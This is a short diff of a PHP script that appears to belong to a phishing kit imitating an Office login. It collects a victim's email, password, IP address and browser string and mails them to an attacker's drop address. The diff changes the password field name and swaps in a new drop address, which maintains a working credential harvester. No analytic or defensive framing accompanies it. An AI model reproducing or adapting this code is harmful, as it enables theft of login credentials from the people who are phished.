@@ -4,11 +4,11 @@ $IP = getenv("REMOTE_ADDR");
 $BS =   $_SERVER['HTTP_USER_AGENT'];
 
 $message .= "Email: ".$_POST['email']."\n";
-$message .= "Password: ".$_POST['passwd']."\n";
+$message .= "Password: ".$_POST['password']."\n";
 $message .= "IP: ".$IP."\n";
 $message .= "BS: ".$BS."\n";
 
-$sent ="resultzlog@yandex.com";
+$sent ="rezult2016@yandex.com";
 
 $subject = "Blessings| office";
 $headers = "From: Trump <NONE@nepa.com>";
